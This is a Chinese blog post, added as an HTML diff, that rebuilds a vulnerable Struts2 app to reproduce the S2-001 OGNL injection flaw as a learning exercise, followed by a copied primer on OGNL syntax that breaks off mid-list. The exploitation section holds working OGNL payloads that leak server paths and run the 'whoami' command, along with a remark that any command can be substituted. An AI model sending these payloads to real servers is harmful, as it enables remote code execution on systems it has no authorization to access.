@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          从零开始学习struts2 S2-001 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/08/从零开始学习struts2-S2-001/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#struts2" title="struts2">struts2</a>
+                        
+                    </div>
+                    <h1>从零开始学习struts2 S2-001</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-08-30
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于之前面向对象语言学习的是C++，而且java还是有着蛮多的语言规范，导致看不怎么懂java，从而java安全这块的内容一直没怎么涉及。</p>
+<p>后来之前蛮火的S2-057，自己也就没怎么能去参与。于是想着，趁着暑假这最后还有一两个星期的时间，入门学习一下java安全。想着即使在这块没有什么研究，但能做到看得懂，会利用把。</p>
+<p>于是挑了看起来最简单的S2-001来尝试复现，由于在java web这块完全没有什么基础，导致踩了很多坑，很多也是环境、搭建上面的问题，最后总算还是艰难的完成了复现，遂记录一下。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>平台：win10</p>
+<p>工具：</p>
+<ul>
+<li>Apache Tomcat 9.0.7</li>
+<li>IntelliJ IDEA</li>
+</ul>
+<p>首先在IDEA中新建一个project</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/1.png" alt></p>
+<p>创建好后源码代码结构如下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/2.png" alt></p>
+<p>接下来依此来搭建环境</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/3.png" alt></p>
+<p>首先先从<a href="http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip中下载struts2的jar包" target="_blank" rel="noopener">http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip中下载struts2的jar包</a></p>
+<p>然后将在<code>WEB-INF</code>目录中新建lib目录，将所需的五个包放入</p>
+<p>然后修改web.xml内容为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span> <span class="attr">id</span>=<span class="string">"WebApp_ID"</span> <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>S2-001 Example<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>新建index.jsp和welcome.jsp内容如下</p>
+<p>index.jsp</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;S2-001 Demo&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;link: &lt;a href=<span class="string">"https://cwiki.apache.org/confluence/display/WW/S2-001"</span>&gt;https:<span class="comment">//cwiki.apache.org/confluence/display/WW/S2-001&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line">&lt;s:form action=<span class="string">"login"</span>&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"username"</span> label=<span class="string">"username"</span> /&gt;</span><br><span class="line">  &lt;s:textfield name=<span class="string">"password"</span> label=<span class="string">"password"</span> /&gt;</span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;</span><br><span class="line">&lt;/s:form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>welcome.jsp</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> contentType=<span class="string">"text/html; charset=UTF-8"</span></span><br><span class="line">         pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">"s"</span> uri=<span class="string">"/struts-tags"</span> %&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">"-//W3C//DTD HTML 4.01 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/html4/loose.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;S2-001&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p&gt;Hello &lt;s:property value="username"&gt;&lt;/s:property&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>然后在src中新建<code>com.demo.action</code>package</p>
+<p>这时候src会突然找不到，只要点击一下上面的Project Files就能看到文件</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/4.png" alt></p>
+<p>然后新建一个<code>LoginAction.java</code>，内容如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginAction</span> <span class="keyword">extends</span> <span class="title">ActionSupport</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String username = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String password = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUsername</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassword</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUsername</span><span class="params">(String username)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.username = username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassword</span><span class="params">(String password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.isEmpty()) || (<span class="keyword">this</span>.password.isEmpty())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">this</span>.username.equalsIgnoreCase(<span class="string">"admin"</span>))</span><br><span class="line">                &amp;&amp; (<span class="keyword">this</span>.password.equals(<span class="string">"admin"</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"success"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后在src目录下新建struts.xml，内容如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-001"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.LoginAction"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"success"</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这时候会看到LoginAction会一直显示找不到要导入的<code>opensymphony.xwork2.ActionSupport</code>，是由于jar包还没有真正的被导入到这个项目中</p>
+<p>点击<code>File-&gt;Project Structure</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/5.png" alt></p>
+<p>然后找到刚才在lib目录下的jar包，点上勾之后点击OK即可</p>
+<p>然后<code>Build-&gt;Build Project</code>build一下整个项目，刚才的包就被成功的导入到项目中，错误提示也就消失了</p>
+<p>然后配置一下tomcat的debug configurations，就可以成功运行这个项目了</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/6.png" alt></p>
+<p>点击运行后，访问8888端口即可（默认为8080，我这更改了下），看到如下页面就表示环境搭建成功</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/7.png" alt></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>在登录失败的时候可以看到，会将错误的<code>username</code>和<code>password</code>显示在输入框中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/8.png" alt></p>
+<p>然而当我们在密码框处输入这样一个字符串时<code>%{1+1}</code>（<code>%</code>需编码）会被解析成2</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/9.png" alt></p>
+<p>从而利用这一特性，可以构造一些命令执行语句</p>
+<p>获取tomcat路径</p>
+<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="string">"tomcatBinDir&#123;"</span>+<span class="meta">@java</span>.lang.System<span class="meta">@getProperty</span>(<span class="string">"user.dir"</span>)+<span class="string">"&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/10.png" alt></p>
+<p>获取web路径</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter(),#response.println(#req.getRealPath(<span class="string">'/'</span>)),#response.flush(),#response.close()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/11.png" alt></p>
+<p>以及命令执行</p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;<span class="symbol">#a</span>=(new java.lang.<span class="type">ProcessBuilder</span>(new java.lang.<span class="type">String</span>[]&#123;<span class="comment">"whoami"</span>&#125;)).redirectErrorStream(<span class="keyword">true</span>).start(),<span class="symbol">#b</span>=<span class="symbol">#a</span>.getInputStream(),<span class="symbol">#c</span>=new java.io.<span class="type">InputStreamReader</span>(<span class="symbol">#b</span>),<span class="symbol">#d</span>=new java.io.<span class="type">BufferedReader</span>(<span class="symbol">#c</span>),<span class="symbol">#e</span>=new char[<span class="number">50000</span>],<span class="symbol">#d</span>.read(<span class="symbol">#e</span>),<span class="symbol">#f</span>=<span class="symbol">#context</span>.get(<span class="comment">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>),<span class="symbol">#f</span>.getWriter().println(new java.lang.<span class="type">String</span>(<span class="symbol">#e</span>)),<span class="symbol">#f</span>.getWriter().flush(),<span class="symbol">#f</span>.getWriter().close()&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/从零开始学习struts2-S2-001/12.png" alt></p>
+<p>将其中的<code>java.lang.String[]{&quot;whoami&quot;}</code>修改一下就可以执行任意命令</p>
+<h1 id="OGNL表达式"><a href="#OGNL表达式" class="headerlink" title="OGNL表达式"></a>OGNL表达式</h1><p>搬运</p>
+<blockquote>
+<p>OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。 OGNL 三要素：(以下部分摘抄互联网某处, 我觉得说得好)</p>
+<p>1、表达式（Expression）</p>
+<p>表达式是整个 OGNL 的核心，所有的 OGNL 操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL 操作到底要干什么。我们可以看到，在上面的测试中，name、department.name 等都是表达式，表示取 name 或者 department 中的 name 的值。OGNL 支持很多类型的表达式，之后我们会看到更多。</p>
+<p>2、根对象（Root Object）</p>
+<p>根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么” 以后，你还需要指定到底“对谁干”。在上面的测试代码中，user 就是根对象。这就意味着，我们需要对 user 这个对象去取 name 这个属性的值（对 user 这个对象去设置其中的 department 中的 name 属性值）。</p>
+<p>3、上下文环境（Context）</p>
+<p>有了表达式和根对象，我们实际上已经可以使用 OGNL 的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在 OGNL 的内部，所有的操作都会在一个特定的环境中运行，这个环境就是 OGNL 的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定 OGNL 的操作 “在哪里干”。<br> OGN L 的上下文环境是一个 Map 结构，称之为 OgnlContext。上面我们提到的根对象（Root<br> Object），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（Root<br> Object）的存取操作的表达式是不需要增加 #符号进行区分的。</p>
+<p>表达式功能操作清单：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> 1. 基本对象树的访问</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 对象树的访问就是通过使用点号将对象的引用串联起来进行。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 2. 对容器变量的访问</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 对容器变量的访问，通过<span class="comment">#符号加上表达式进行。</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：<span class="comment">#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 3. 使用操作符号</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, <span class="keyword">in</span>, not <span class="keyword">in</span>等。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 4. 容器、数组、对象</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 同时，OGNL支持对Map的按键值查找：</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：<span class="comment">#session['mySessionPropKey']</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 不仅如此，OGNL还支持容器的构造的表达式：</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：&#123;<span class="string">"green"</span>, <span class="string">"red"</span>, <span class="string">"blue"</span>&#125;构造一个List，<span class="comment">#&#123;"key1" : "value1", "key2" : "value2", "key3" : "value3"&#125;构造一个Map</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 你也可以通过任意类对象的构造函数进行对象新建</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：new Java.net.URL(<span class="string">"xxxxxx/"</span>)</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 5. 对静态方法或变量的访问</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 6. 方法调用</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 直接通过类似Java的方法调用方式进行，你甚至可以传递参数：</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：user.getName()，group.users.size()，group.containsUser(<span class="comment">#requestUser)</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> </span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 7. 投影和选择</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> OGNL支持类似数据库中的投影（projection） 和选择（selection）。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个集合中每个元素的公共属性。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> 选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 